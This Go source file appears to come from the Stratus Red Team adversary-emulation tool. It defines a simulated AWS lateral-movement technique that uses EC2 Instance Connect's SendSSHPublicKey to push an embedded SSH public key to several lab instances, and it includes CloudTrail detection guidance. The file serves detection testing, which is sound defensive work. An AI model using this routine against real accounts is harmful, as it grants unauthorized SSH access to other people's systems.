package aws

import (
	"context"
	_ "embed"
	"errors"
	"strings"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed my_key.pub
var publicSSHKey string

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.lateral-movement.ec2-send-ssh-public-key",
		FriendlyName: "Usage of ec2instanceconnect:SendSSHPublicKey on multiple instances",
		IsSlow:       true,
		Description: `
Simulates an attacker pushing a Secure Shell (SSH) public key to multiple EC2 instances, which then will allow anyone with the corresponding private key to 
connect directly to the systems via SSH.

Warm-up:

- Create multiple EC2s instances and VPC (takes a few minutes).

Detonation: 

- Adds a public SSH key to the EC2 for 60 seconds.

References:

- https://sysdig.com/blog/2023-global-cloud-threat-report/
`,
		Detection: `
Identify, through CloudTrail's <code>SendSSHPublicKey</code> event, when a user is adding an SSH key to multiple EC2s.
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true, 
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2instanceconnectClient := ec2instanceconnect.NewFromConfig(providers.AWS().GetConnection())
	ec2IDsString := params["instance_ids"]
	splitec2IDsString := strings.Split(ec2IDsString, ",")

    for _, instanceID := range splitec2IDsString {
		cleanInstanceID := strings.Trim(instanceID, " \"\n\r")
        err := sendSSHPublicKey(context.TODO(), ec2instanceconnectClient, cleanInstanceID, "ec2-user", publicSSHKey)
        if err != nil {
            return errors.New("failed to send SSH public key to instance " + cleanInstanceID + err.Error())
        }

        log.Printf("SSH public key sent successfully to instance %s", cleanInstanceID)
    }
	return nil
}

func sendSSHPublicKey(ctx context.Context, ec2instanceconnectClient *ec2instanceconnect.Client, instanceId, instanceOSUser, sshPublicKey string) error {
    _, err := ec2instanceconnectClient.SendSSHPublicKey(ctx, &ec2instanceconnect.SendSSHPublicKeyInput{
        InstanceId:     aws.String(instanceId),
        InstanceOSUser: aws.String(instanceOSUser),
        SSHPublicKey:   aws.String(sshPublicKey),
    })

    return err
}